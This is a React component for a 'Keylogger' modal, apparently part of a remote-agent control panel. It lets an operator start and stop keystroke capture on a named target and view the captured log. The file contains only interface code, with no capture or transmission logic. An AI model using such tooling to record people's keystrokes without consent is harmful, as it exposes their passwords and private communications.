import { useModalEscape } from '../hooks/useModalEscape';
import { formatKeyloggerForDisplay } from '../utils/formatKeyloggerLog';

type KeyloggerModalProps = {
  open: boolean;
  targetLabel: string;
  running: boolean;
  content: string;
  busy: boolean;
  onClose: () => void;
  onStart: () => void;
  onStop: () => void;
  onRefresh: () => void;
};

function KeyloggerModal({
  open,
  targetLabel,
  running,
  content,
  busy,
  onClose,
  onStart,
  onStop,
  onRefresh,
}: KeyloggerModalProps) {
  useModalEscape(open, onClose);
  if (!open) return null;

  return (
    <div className="modal-backdrop" onClick={onClose} role="presentation">
      <div className="modal-panel process-modal" onClick={(e) => e.stopPropagation()} role="dialog">
        <div className="modal-header">
          <div>
            <h2>Keylogger</h2>
            <p className="modal-sub">
              {targetLabel} · status {running ? 'Running' : 'Stopped'}
            </p>
          </div>
          <button className="btn modal-close" onClick={onClose} type="button">
            Close
          </button>
        </div>
        <div className="process-modal-toolbar">
          <button
            className="btn primary"
            disabled={busy || running}
            onClick={onStart}
            type="button"
          >
            Start keylogger
          </button>
          <button
            className="btn btn-danger"
            disabled={busy || !running}
            onClick={onStop}
            type="button"
          >
            Stop keylogger
          </button>
        </div>
        <div className="process-table-wrap">
          <p className="modal-sub keylogger-log-hint">
            Log shown in local time; key names follow macOS US layout (raw keycodes from agent).
          </p>
          <pre className="modal-body-inline">
            {content ? formatKeyloggerForDisplay(content) : '(empty log)'}
          </pre>
        </div>
      </div>
    </div>
  );
}

export default KeyloggerModal;
